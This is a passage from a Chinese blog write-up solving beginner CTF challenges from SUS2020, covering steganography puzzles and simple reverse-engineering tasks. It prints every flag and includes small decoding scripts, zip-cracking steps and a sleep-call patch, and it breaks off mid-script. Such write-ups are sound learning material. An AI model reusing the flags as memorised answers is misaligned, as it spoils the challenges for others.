{"title":"SUS2020招新赛","slug":"SUS2020招新赛","date":"2020-02-10T13:12:35.768Z","updated":"2020-02-11T03:02:11.590Z","comments":true,"excerpt":"","content":"<center><h1>SUS2019招新赛<center/>\n# SUS2020招新赛\n\n<h2 id=\"0-写在最前面\"><a href=\"#0-写在最前面\" class=\"headerlink\" title=\"0.写在最前面\"></a>0.写在最前面</h2><p>好久都没有像这样认认真真地做题了，越做越发现自己菜的一批</p>\n<p>自己的的确确很弱，很菜，甚至将来可能最多勉强糊口饭吃，但是能参加CTF竞赛我就觉得已经很开心了，以下就是一个普通蒟蒻的心(辛)路历程</p>\n<p>P.S.心里苦呀，总是我先做完，师傅们才放出Hint</p>\n<h2 id=\"1-MISC\"><a href=\"#1-MISC\" class=\"headerlink\" title=\"1.MISC\"></a>1.MISC</h2><p>感觉耳目一新，学到了许多东西。出MISC题目还真是考验涉猎面的一件事</p>\n<h3 id=\"0x1-Hello-SUS\"><a href=\"#0x1-Hello-SUS\" class=\"headerlink\" title=\"0x1 Hello_SUS\"></a>0x1 Hello_SUS</h3><p>签到题 其实参加的同学蛮多的，可以多出一点更加简单，分值较低的题目，感觉后期退赛的人数太多可能就是由于之后的做题门槛对于无基础的同学来说高了一些些</p>\n<blockquote>\n<p> flag: SUSCTF{hello_SUS2020} </p>\n</blockquote>\n<h3 id=\"0x2-音游\"><a href=\"#0x2-音游\" class=\"headerlink\" title=\"0x2  音游\"></a>0x2  音游</h3><p>不会真的有人打通关来获得flag的吧，我这种手残党是没办法了。</p>\n<p>给了Github链接，OnlyMyCube.js里发现了关键词flag</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205153415201.png\" alt=\"image-20200205153415201\"></p>\n<p>在Github目录下找到secret.obj,一开始天真地想把这个obj通过指向目录和更改world的update直接加载出来，当然失败了，毕竟感觉缺了些什么，而且oc师傅写了这么久的代码，我也不可能一下子就全部掌握，查一下obj文件，发现可以借助在线网站浏览直接打开，（吐槽一下，一开始用的<strong>巴别鸟</strong>，结果失败了，耳机里一直放着邦邦的曲子，无限降智）（题外话，超炮3没怎么看（大会员白冲了），如果是其他神曲没准会准备直接通关（x））</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205153900372.png\" alt=\"image-20200205153900372\"></p>\n<p>把这两行乱七八糟的给注释了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205153847385.png\" alt=\"image-20200205153847385\"></p>\n<p>直接打开获得flag</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205154121517.png\" alt=\"image-20200205154121517\"></p>\n<blockquote>\n<p>flag: SUSCTF{Webgl_3D_game}</p>\n</blockquote>\n<h3 id=\"0x3-misc-hhh\"><a href=\"#0x3-misc-hhh\" class=\"headerlink\" title=\"0x3  misc_hhh\"></a>0x3  misc_hhh</h3><p>直接看GIF，有一帧是二维码，不够肯定没那么简单</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205154506961.png\" alt=\"image-20200205154506961\"></p>\n<p>Ulead GIF 直接找到那一帧扫码</p>\n<p> LSAuLi4uIC4uIC4uLiAgIC4uLiAgLS4gLS0tIC0gIC4uLS4gLi0uLiAuLSAtLS4= </p>\n<p>很明显的BASE64，直接解码</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205154800964.png\" alt=\"image-20200205154800964\"></p>\n<p>肉眼可见-&gt;摩尔斯</p>\n<p>获得12位字符串thissnotflag</p>\n<p>用foremost对图片直接处理</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155253807.png\" alt=\"image-20200205155253807\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155322456.png\" alt=\"image-20200205155322456\"></p>\n<p>两个压缩包，一个写明了要fix文件头，另一个很明显，12letters就是刚刚的thissnotflag</p>\n<p>获得前一半的密码SUS{DecrYption</p>\n<p>fix_head.zip扔winhex里面修改 PJ-&gt;PK</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155648430.png\" alt=\"image-20200205155648430\"></p>\n<p>得到的的图片名，含义已经很清楚了，直接去这个网站上找解码工具</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155735967.png\" alt=\"image-20200205155735967\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155846337.png\" alt=\"image-20200205155846337\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205155912272.png\" alt=\"image-20200205155912272\"></p>\n<p>得到后一部分flag</p>\n<blockquote>\n<p>flag:   SUS{DecrYption_aNd_h1dE} </p>\n</blockquote>\n<h3 id=\"0x4-misc-half\"><a href=\"#0x4-misc-half\" class=\"headerlink\" title=\"0x4  misc_half\"></a>0x4  misc_half</h3><p>又是图片隐写</p>\n<p>写了half脑侧应该属于图片显示不全类型，扔winhex里搞搞</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205160324742.png\" alt=\"image-20200205160324742\"></p>\n<p>直接看到了一截base64，二话不说先解码</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205160715361.png\" alt=\"image-20200205160715361\"></p>\n<p>意料之中，一半flag SUSCTF{aTTr1but3_64QR</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205160952794.png\" alt=\"image-20200205160952794\"></p>\n<p>属性里面有提示 </p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205161610586.png\" alt=\"image-20200205161610586\">根据给的blog找到了更改方法</p>\n<p>01-&gt;02</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205162144153.png\" alt=\"image-20200205162144153\"></p>\n<p>获得完整表情包，依然扫码</p>\n<p>获得： 平等诚信平等公正爱国自由平等公正敬业自由法治公正爱国法治自由平等友善敬业公正友善公正公正友善爱国法治公正和谐和谐法治文明法治自由法治友善法治</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205162316677.png\" alt=\"image-20200205162316677\"></p>\n<p>获得另一半（，flag</p>\n<blockquote>\n<p>flag:  SUSCTF{aTTr1but3_64QR_hEiGht_lnv3rt}</p>\n</blockquote>\n<h3 id=\"0x5-OpenCV-easy\"><a href=\"#0x5-OpenCV-easy\" class=\"headerlink\" title=\"0x5  OpenCV_easy\"></a>0x5  OpenCV_easy</h3><p>通俗易懂 OpenCV 走一波</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205162614837.png\" alt=\"image-20200205162614837\"></p>\n<p>直接就可以看到flag了，输出图片</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205162718331.png\" alt=\"image-20200205162718331\"></p>\n<p>骚紫色nb</p>\n<blockquote>\n<p>flag:  SUSCTF{1mage_binaryz4tion}</p>\n</blockquote>\n<h3 id=\"0x6-misc-tools\"><a href=\"#0x6-misc-tools\" class=\"headerlink\" title=\"0x6  misc_tools\"></a>0x6  misc_tools</h3><p>太良心了，工具包都给齐了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205163046887.png\" alt=\"image-20200205163046887\"></p>\n<p>看看文件名称，做题顺序已经很清楚了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205163248587.png\" alt=\"image-20200205163248587\"></p>\n<p>二话不说 直接抓</p>\n<p>关键词let_me_in</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205163432162.png\" alt=\"image-20200205163432162\"></p>\n<p>打开txt 就发现了原来玩NaZo的既视感，放到chrome的控制台输出</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205163556416.png\" alt=\"image-20200205163556416\"></p>\n<p>居然是like_you</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205163626136.png\" alt=\"image-20200205163626136\"></p>\n<p>利用给的mp3解码器解码，获得新的提示</p>\n<p>password:1p0ch_wanna_gfs</p>\n<p>没错了，迫害的味道</p>\n<p><img src=\"C:%5CUsers%5Chp%5CDownloads%5Cnanana%5Cnanana%5Cmaybe_ntfs%5CLSB1%5CLSB1.png\" alt=\"LSB1\"></p>\n<p>然后就是LSB图片隐写技术</p>\n<p>利用给的Stegsolve (1).jar</p>\n<p>设置好参数，即可看见密码了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205164019874.png\" alt=\"image-20200205164019874\"></p>\n<blockquote>\n<p>flag: SUSCTF{nTf5_jsFuck_lsB}</p>\n</blockquote>\n<h3 id=\"0x7-遇事不决？\"><a href=\"#0x7-遇事不决？\" class=\"headerlink\" title=\"0x7  遇事不决？\"></a>0x7  遇事不决？</h3><p>又是压缩包，不过还是常见的压缩包处理方法</p>\n<p>最外层标准的伪加密，09/01改00</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205164321129.png\" alt=\"image-20200205164321129\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205164546007.png\" alt=\"image-20200205164546007\"></p>\n<p>送了一个有用的txt</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205164644598.png\" alt=\"image-20200205164644598\"></p>\n<p>ctc32一样就不好意思了，明文爆破一波</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205164813950.png\" alt=\"image-20200205164813950\"></p>\n<p>另存解密的压缩包</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205165040873.png\" alt=\"image-20200205165040873\"></p>\n<p>硬核佛语</p>\n<p>解码一波</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205165155819.png\" alt=\"image-20200205165155819\"></p>\n<p>迫害AA！！（真好</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205165423287.png\" alt=\"image-20200205165423287\"></p>\n<p>这个就直接爆破就行了，<img src=\"https://5aku1em.github.io/images/image-20200205165903915.png\" alt=\"image-20200205165903915\"></p>\n<p>赛博朋克2077？？？？</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205165238175.png\" alt=\"image-20200205165238175\"></p>\n<p>获得一张二维码，补一补</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205165304548.png\" alt=\"image-20200205165304548\"></p>\n<p>得到flag </p>\n<blockquote>\n<p>flag:   SUSCTF{W000w!_You_Fix_QR_code} </p>\n</blockquote>\n<h2 id=\"2-reserve\"><a href=\"#2-reserve\" class=\"headerlink\" title=\"2. reserve\"></a>2. reserve</h2><p>逆向没什么好说的，都挺简单的，无脑推就行了</p>\n<p>(被打了，我是dd)</p>\n<h3 id=\"0x1-checkin\"><a href=\"#0x1-checkin\" class=\"headerlink\" title=\"0x1  checkin\"></a>0x1  checkin</h3><p><img src=\"https://5aku1em.github.io/images/image-20200205170320214.png\" alt=\"image-20200205170320214\"></p>\n<p>IDA打开，检查main函数，flag直接糊脸上</p>\n<blockquote>\n<p>flag: SUSCTF{Welc0me_to_SUSCTF_2020}</p>\n</blockquote>\n<h3 id=\"0x2-ez-x1r\"><a href=\"#0x2-ez-x1r\" class=\"headerlink\" title=\"0x2  ez_x1r\"></a>0x2  ez_x1r</h3><p>xor-&gt;x0r-&gt;x1r,</p>\n<p>就是一个最基础的异或可逆</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205170658366.png\" alt=\"image-20200205170658366\"></p>\n<p>找到的基础串</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> a=<span class=\"string\">\"TRBUGzX1t^FnneA^Y1s|\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;a.length();++i)&#123;</span><br><span class=\"line\">\t\ta[i]=a[i]^<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;a&lt;&lt;<span class=\"built_in\">endl</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>运行出结果</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205170927961.png\" alt=\"image-20200205170927961\"></p>\n<blockquote>\n<p>flag :  SUSCTF{Y0u_Good@_X0r}</p>\n</blockquote>\n<h3 id=\"0x3-消失的flag\"><a href=\"#0x3-消失的flag\" class=\"headerlink\" title=\"0x3  消失的flag\"></a>0x3  消失的flag</h3><p>对我赤果果的迫害！！！抗议！！！</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205171208545.png\" alt=\"image-20200205171208545\"></p>\n<p>shift+F12直接看到了具有代表性的字符画</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205171337628.png\" alt=\"image-20200205171337628\"></p>\n<p>输出完了就是这完整的迫害之词</p>\n<blockquote>\n<p>flag: SUSCTF{lmy_want_gril_friends}</p>\n</blockquote>\n<p>()</p>\n<h3 id=\"0x4-wait-for-AA\"><a href=\"#0x4-wait-for-AA\" class=\"headerlink\" title=\"0x4  wait_for_AA\"></a>0x4  wait_for_AA</h3><p>一看就有时间有关的。。。nop既视感</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205171627162.png\" alt=\"image-20200205171627162\"></p>\n<p>这也太直白了吧。。</p>\n<p>放进edb-debug里面nop掉那个sleep</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172050845.png\" alt=\"image-20200205172050845\"></p>\n<blockquote>\n<p>flag:  SUSCTF{patch_is_sooooo_ez}  </p>\n</blockquote>\n<h3 id=\"0x5-bbbb4444se\"><a href=\"#0x5-bbbb4444se\" class=\"headerlink\" title=\"0x5   bbbb4444se\"></a>0x5   bbbb4444se</h3><p>base64…….</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172317821.png\" alt=\"image-20200205172317821\"></p>\n<p>一眼就看到了编码，不过是大小写互换了的</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> st=<span class=\"string\">\"u1vtq1rgE0fFzdfMzMvYx2jHC2u2nf90ngjSzx0=\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;st.length();i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(st[i]&gt;=<span class=\"string\">'a'</span>&amp;&amp;st[i]&lt;=<span class=\"string\">'z'</span>)st[i]+=<span class=\"string\">'A'</span>-<span class=\"string\">'a'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(st[i]&gt;=<span class=\"string\">'A'</span>&amp;&amp;st[i]&lt;=<span class=\"string\">'Z'</span>)st[i]+=<span class=\"string\">'a'</span>-<span class=\"string\">'A'</span>;</span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;st&lt;&lt;<span class=\"built_in\">endl</span>;</span><br></pre></td></tr></table></figure>\n\n<p>转换一拨</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172431358.png\" alt=\"image-20200205172431358\"></p>\n<p>再解码</p>\n<blockquote>\n<p>flag:  SUSCTF{A_d1ffer_base64_t4ble}  </p>\n</blockquote>\n<h1 id=\"0x6-ez-cpp\"><a href=\"#0x6-ez-cpp\" class=\"headerlink\" title=\"0x6  ez_cpp\"></a>0x6  ez_cpp</h1><p>远端运行发现了提示</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172800297.png\" alt=\"image-20200205172800297\"></p>\n<p>先脱壳再说</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upx -d XXXXX</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以开开心心玩耍了</p>\n<p>发现关键字符串</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172854897.png\" alt=\"image-20200205172854897\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205172942370.png\" alt=\"image-20200205172942370\"></p>\n<p>看到了trans函数</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205173007295.png\" alt=\"image-20200205173007295\"></p>\n<p>out函数做了限制</p>\n<p>string第八位是t</p>\n<p>要求’t’^=char（输入）-‘0’=’u’</p>\n<p>很明显，输入1就可</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205191112159.png\" alt=\"image-20200205191112159\"></p>\n<blockquote>\n<p>flag:  SUSCTF{uihr_0r_o1u_gm5f}</p>\n</blockquote>\n<h3 id=\"0x7-where-1s-AA\"><a href=\"#0x7-where-1s-AA\" class=\"headerlink\" title=\"0x7 where_1s_AA\"></a>0x7 where_1s_AA</h3><p>走程序 IDA F5</p>\n<p>main函数里面没意义，联系AA，她也不会给你flag</p>\n<p>直接奔着check去。</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205191404982.png\" alt=\"image-20200205191404982\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205191541734.png\" alt=\"image-20200205191541734\"></p>\n<p>其他的看不懂无所谓，看到那个flag就知道那个地方是关键了</p>\n<p>猜也猜得到 点进aSuf 肯定是SUSCTF{}之类的，关键处理好falg就行</p>\n<p>f函数就是个return。。，解析上面的code，写出脚本</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> st[<span class=\"number\">100</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> v7[<span class=\"number\">96</span>]; <span class=\"comment\">// [rsp+30h] [rbp-80h]</span></span><br><span class=\"line\">  v7[<span class=\"number\">0</span>] = <span class=\"string\">'%'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">2</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">3</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">4</span>] = <span class=\"string\">'j'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">5</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">6</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">7</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">8</span>] = <span class=\"string\">'c'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">9</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">10</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">11</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">12</span>] = <span class=\"string\">'f'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">13</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">14</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">15</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">16</span>] = <span class=\"string\">'%'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">17</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">18</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">19</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">20</span>] = <span class=\"string\">'7'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">21</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">22</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">23</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">24</span>] = <span class=\"string\">'7'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">25</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">26</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">27</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">28</span>] = <span class=\"string\">'U'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">29</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">30</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">31</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">32</span>] = <span class=\"string\">'\\''</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">33</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">34</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">35</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">36</span>] = <span class=\"string\">'i'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">37</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">38</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">39</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">40</span>] = <span class=\"string\">'U'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">41</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">42</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">43</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">44</span>] = <span class=\"string\">'_'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">45</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">46</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">47</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">48</span>] = <span class=\"string\">'d'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">49</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">50</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">51</span>] = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">52</span>] = <span class=\"string\">'U'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">53</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">54</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">55</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">56</span>] = <span class=\"string\">'O'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">57</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">58</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">59</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">60</span>] = <span class=\"string\">'e'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">61</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">62</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">63</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">64</span>] = <span class=\"string\">'k'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">65</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">66</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">67</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">68</span>] = <span class=\"string\">'h'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">69</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">70</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">71</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">72</span>] = <span class=\"string\">'U'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">73</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">74</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">75</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">76</span>] = <span class=\"string\">'^'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">77</span>] = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">78</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">79</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">80</span>] = <span class=\"string\">'['</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">81</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">82</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">83</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">84</span>] = <span class=\"string\">'W'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">85</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">86</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">87</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">88</span>] = <span class=\"string\">'h'</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">89</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">90</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">91</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">92</span>] = <span class=\"string\">'j'</span>;</span><br><span class=\"line\">  v7[<span 